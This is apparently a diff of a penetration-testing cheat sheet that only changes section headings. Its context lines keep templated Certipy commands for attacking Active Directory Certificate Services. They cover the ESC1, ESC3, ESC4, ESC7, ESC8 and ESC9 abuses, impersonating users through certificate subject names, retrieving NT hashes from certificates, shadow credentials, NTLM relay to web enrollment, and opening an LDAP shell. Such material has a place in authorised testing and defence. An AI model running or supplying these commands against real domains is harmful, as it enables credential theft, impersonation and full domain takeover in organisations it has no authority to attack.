@@ -6,7 +6,7 @@
 
 ---
 
-## Find Vulnerable Certificate Templates
+## find vulnerable cert templates
 Enumerate AD CS templates and flag templates vulnerable to ESC1-ESC11.
 
 ```bash
@@ -17,7 +17,7 @@ certipy-ad find -u '{{USERNAME:str}}@{{DOMAIN:domain}}' -p '{{PASSWORD:str}}' -d
 
 ---
 
-## ESC1 - Request Cert with Arbitrary SAN
+## esc1 request cert SAN
 Request a certificate as another user by specifying a UPN in the subject alternative name.
 
 ```bash
@@ -28,7 +28,7 @@ certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSW
 
 ---
 
-## Authenticate with PFX Certificate
+## auth pfx cert get nthash
 Use a previously requested certificate to authenticate as the target user and retrieve their NT hash.
 
 ```bash
@@ -39,7 +39,7 @@ certipy-ad auth -pfx '{{PFX:file:administrator.pfx}}' -username '{{USERNAME:str:
 
 ---
 
-## ESC3 - Enrollment Agent Abuse
+## esc3 enrollment agent abuse
 Request a cert on behalf of another user using an Enrollment Agent template.
 
 ```bash
@@ -50,7 +50,7 @@ certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSW
 
 ---
 
-## ESC4 - Overwrite Vulnerable Template
+## esc4 overwrite template
 Overwrite a template configuration to make it vulnerable to ESC1, saving the original for restoration.
 
 ```bash
@@ -61,7 +61,7 @@ certipy-ad template -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{
 
 ---
 
-## ESC4 - Restore Original Template Config
+## esc4 restore template config
 Restore the saved configuration of a template after exploitation.
 
 ```bash
@@ -72,7 +72,7 @@ certipy-ad template -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{
 
 ---
 
-## Shadow Credentials (Auto)
+## add shadow credentials auto
 Abuse `GenericWrite` over a target by adding a key credential link, then retrieve the NT hash.
 
 ```bash
@@ -83,7 +83,7 @@ certipy-ad shadow auto -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password 
 
 ---
 
-## ESC7 - Add Officer Rights
+## esc7 add officer rights
 Grant yourself `ManageCertificates` rights on the CA to issue pending requests.
 
 ```bash
@@ -94,7 +94,7 @@ certipy-ad ca -ca '{{CA_NAME:str:corp-DC-CA}}' -add-officer '{{USERNAME:str}}' -
 
 ---
 
-## ESC7 - Enable SubCA Template
+## esc7 enable subca template
 Enable the SubCA certificate template on the CA, required for the ESC7 attack chain.
 
 ```bash
@@ -105,7 +105,7 @@ certipy-ad ca -ca '{{CA_NAME:str:corp-DC-CA}}' -enable-template SubCA -username 
 
 ---
 
-## ESC7 - Issue a Failed Request
+## esc7 issue failed request
 Force-issue a previously denied certificate request using ManageCertificates rights.
 
 ```bash
@@ -116,7 +116,7 @@ certipy-ad ca -ca '{{CA_NAME:str:corp-DC-CA}}' -issue-request {{REQUEST_ID:int}}
 
 ---
 
-## ESC7 - Retrieve Issued Certificate
+## esc7 retrieve issued cert
 Download the certificate after the request has been approved.
 
 ```bash
@@ -127,7 +127,7 @@ certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -password '{{PASSW
 
 ---
 
-## ESC8 - NTLM Relay to AD CS Web Enrollment
+## esc8 ntlm relay web enrollment
 Run a relay listener that forwards inbound NTLM auth to the CA's web enrollment endpoint to obtain a cert.
 
 ```bash
@@ -138,7 +138,7 @@ certipy-ad relay -ca {{CA_HOST:domain:ca.corp.local}}
 
 ---
 
-## ESC9 - Modify UPN Before Cert Request
+## esc9 modify UPN cert request
 Update a target user's UPN to impersonate another principal in the certificate.
 
 ```bash
@@ -149,7 +149,7 @@ certipy-ad account update -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -passwo
 
 ---
 
-## Request Cert with Hash (NTLM)
+## request cert with NTLM hash
 Request a certificate as a user using their NT hash (e.g., after Shadow Credentials).
 
 ```bash
@@ -160,7 +160,7 @@ certipy-ad req -username '{{USERNAME:str}}@{{DOMAIN:domain}}' -hashes :{{NTHASH:
 
 ---
 
-## Auth via LDAP Shell (Schannel)
+## auth ldap shell schannel
 Authenticate to LDAP using a certificate via Schannel for RBCD attacks.
 
 ```bash
@@ -171,7 +171,7 @@ certipy-ad auth -pfx '{{PFX:file:dc.pfx}}' -dc-ip {{DC_IP:ip}} -ldap-shell
 
 ---
 
-## List CA Enrollment Endpoints (certutil)
+## list CA enrollment endpoints
 Identify Certificate Enrollment Service URLs published by enterprise CAs.
 
 ```bash
